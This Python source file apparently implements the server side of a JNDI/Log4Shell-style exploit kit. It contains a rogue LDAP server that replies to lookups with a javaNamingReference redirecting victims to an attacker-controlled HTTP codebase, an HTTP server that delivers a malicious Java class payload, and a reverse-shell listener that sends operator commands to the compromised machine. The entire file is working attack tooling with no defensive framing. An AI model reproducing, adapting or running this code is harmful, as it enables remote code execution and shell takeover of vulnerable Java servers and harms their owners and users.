import socket
import random
import string
from logger import Logger, Color
from threading import Thread


class Sock:
    once = False
    specific_listener = False

    def __init__(self, ip, port):
        self.ip = ip
        real_ip = ip if Sock.specific_listener else '0.0.0.0'
        self.port = port
        self.logger = Logger(self.__class__.__name__ + ' Server')
        self.logger.info(f'Listening on port {real_ip}:{self.port}')
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((real_ip, int(port)))
        self.server.listen()
        while True:
            try:
                self.conn, addr = self.server.accept()
                self.addr = f'{addr[0]}:{addr[1]}->{self.ip}:{self.port}'
                self.log('Connected')
                self.handle_connection()
                self.log('Connection closed')
            except Exception as ex:
                self.logger.error_exception(f'Client {self.addr} generated an exception:', ex)
            except KeyboardInterrupt:
                self.close()
                break
            finally:
                if self.conn:
                    self.conn.close()
                if Sock.once:
                    self.close()
                    break

    def close(self):
        if self.conn:
            self.conn.close()
        self.log('Closing listener.')
        self.server.close()

    def log(self, msg, level='info'):
        self.logger.log(level, f'[{self.addr}] {msg}')

    def handle_connection(self):
        raise NotImplementedError()


class HTTP(Sock):
    def __init__(self, ip, port, java_payload):
        self.java_payload = java_payload
        super(HTTP, self).__init__(ip, port)

    def handle_connection(self):
        request = self.conn.recv(8096)
        class_name = request.split(b'\r\n', 1)[0].split(b' ')[1].split(b'.class', 1)[0].decode()
        self.log(f'Request for {class_name}')
        class_name = class_name[1:]
        header = b'HTTP/1.0 200 OK\nContent-type: application/octet-stream\n\n'
        self.conn.send(header)
        self.log(f'Sending Java class payload {self.java_payload.__class__.__name__} as class {class_name}')
        self.conn.send(self.java_payload.payload(class_name))


class LDAP(Sock):
    def __init__(self, ip, port, query_name, http_port, java_payload):
        self.query_name = query_name
        self.http_port = http_port
        self.java_payload = java_payload
        super(LDAP, self).__init__(ip, port)

    def handle_connection(self):
        handshake = self.conn.recv(8096)
        self.conn.send(b'0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00')
        query = self.conn.recv(8096)
        self.conn.send(self.make_packet(self.query_name))

    def make_header(self, query_name, records):
        query_name = query_name.encode()
        size_query = bytes([len(query_name)])
        size_b = bytes([len(b'\x04' + size_query + query_name + b'0\x81\x82' + records)])
        size_a = bytes([len(b'\x02\x01\x02d\x81' + size_b + b'\x04' + size_query + query_name + b'0\x81\x82' + records)])
        header = b'0\x81' + size_a + b'\x02\x01\x02d\x81' + size_b + b'\x04' + size_query + query_name + b'0\x81\x82'
        return header

    def make_random_classname(self):
        alph = string.ascii_letters + string.digits
        return f'PayloadClass_{"".join(random.choices(alph, k=8))}'

    def make_record(self, key, value):
        size_key = bytes([len(key)])
        size_value = bytes([len(value)])
        size_til_end = bytes([len(b'\x04' + size_value + value)])
        record_length = bytes([len(b'\x04' + size_key + key + b'1' + size_til_end + b'\x04' + size_value + value)])
        record = b'0' + record_length + b'\x04' + size_key + key + b'1' + size_til_end + b'\x04' + size_value + value
        return record

    def make_records(self):
        class_name = self.make_random_classname().encode()
        url = f'http://{self.ip}:{self.http_port}/'.encode()
        self.log(f'Redirecting to {url.decode()}{class_name.decode()}.class')
        records = self.make_record(b'javaClassName', class_name)
        records += self.make_record(b'javaCodeBase', url)
        records += self.make_record(b'objectClass', b'javaNamingReference')
        records += self.make_record(b'javaFactory', class_name)
        return records

    def make_packet(self, query_name):
        records = self.make_records()
        header = self.make_header(query_name, records)
        packet = header + records + b'0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00'
        return packet


class ReverseShellListener(Sock):
    def __init__(self, ip, port):
        super(ReverseShellListener, self).__init__(ip, port)

    def read_input(self):
        try:
            while True:
                line = input('> ')
                print('\033[1F', end='')  # Move cursor to beginning of previous line
                self.log(Color.NORMAL + Color.GREEN + '[->] ' + Color.END + line)
                self.conn.send(line.encode() + b'\n')
        except (EOFError, KeyboardInterrupt):
            self.log('Input closed.')

    def handle_connection(self):
        self.log('Successfully got a connection to reverse shell!', 'success')
        Thread(target=self.read_input).start()
        buff = b''
        while True:
            buff += self.conn.recv(8096)
            while b'\n' in buff:
                line, buff = buff.split(b'\n', 1)
                self.log(Color.NORMAL + Color.BLUE + '[<-] ' + Color.END + line.decode())
